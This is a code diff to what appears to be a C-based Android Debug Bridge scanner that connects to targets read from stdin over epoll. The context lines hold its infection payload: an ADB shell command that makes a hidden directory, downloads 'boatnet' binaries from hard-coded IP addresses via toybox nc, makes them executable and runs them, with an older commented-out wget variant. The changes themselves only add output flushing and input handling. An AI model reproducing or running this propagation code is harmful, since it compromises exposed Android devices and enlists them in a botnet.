@@ -416,13 +416,14 @@ static void process_event(struct epoll_event *pp, int core_id)
 
         printf("Established (%d.%d.%d.%d:%d) FD %d\n", target_connection[pp->data.fd].addr & 0xff, (target_connection[pp->data.fd].addr >> 8) & 0xff, (target_connection[pp->data.fd].addr >> 16) & 0xff, (target_connection[pp->data.fd].addr >> 24) & 0xff, ntohs(target_connection[pp->data.fd].port), pp->data.fd);
 
+        fflush(stdout);
         send(pp->data.fd, CNXN, CNXN_SIZE, MSG_NOSIGNAL);
 //        adb_send_data(pp->data.fd, "shell:cd /data/local/tmp; wget http://193.32.162.27/bins/parm; wget http://193.32.162.27/bins/parm7; wget http://193.32.162.27/bins/parm6; wget http://193.32.162.27/bins/parm5; chmod +x *; ./parm test; ./parm7 test7; ./parm6 test6; ./parm5 test5;");
         adb_send_data(pp->data.fd, "shell:cd /data/local/tmp; su 0 mkdir .wellover222 || mkdir .wellover222; cd .wellover222; toybox nc 84.200.81.239 2228 > boatnet.arm7; toybox nc 84.200.81.239 2226 > boatnet.arm5; toybox nc 84.200.81.239 2227 > boatnet.arm6; toybox nc 84.200.81.239 2225 > boatnet.arm; su 0 chmod 777 boatnet.arm7 boatnet.arm5 boatnet.arm6 boatnet.arm || chmod 777 boatnet.arm7 boatnet.arm5 boatnet.arm6 boatnet.arm; su 0 ./boatnet.arm7 arm7; ./boatnet.arm5; ./boatnet.arm6; ./boatnet.arm; su 0 ./boatnet.arm7 arm5 || ./boatnet.arm5 arm5 || ./boatnet.arm6 arm5 || ./boatnet.arm arm5;");        
 
         sent++;
-
-        printf("da gui lenh make by henry", pp->data.fd);
+        printf("da gui lenh make by henry\n");
+        fflush(stdout);
 
         target_connection[pp->data.fd].timeout = time(NULL);
 
@@ -546,6 +547,7 @@ static void *statistics(void *arg)
 
         printf("%ds | Processed: %d | Sent: %d | Total: %d\n", seconds, processed, sent, total);
 
+        fflush(stdout);
         sleep(1);
 
         seconds++;
@@ -582,7 +584,7 @@ static void *epoll_worker(void *arg)
 
     CPU_ZERO(&cpu_set);
 
-    
+
 
     thread = pthread_self();
 
@@ -774,13 +776,21 @@ void main(void)
 
         char buf[4096];
 
-    
+
 
         if(fgets(buf, sizeof(buf), stdin) == NULL)
 
         {
 
-            sleep(1);
+            if(feof(stdin))
+
+            {
+
+                clearerr(stdin);
+
+            }
+
+            usleep(1000);
 
             continue;
 
@@ -809,6 +819,10 @@ void main(void)
 
 
         load_target(&h);
+
+
+
+        fflush(stdout);
 
     }
 
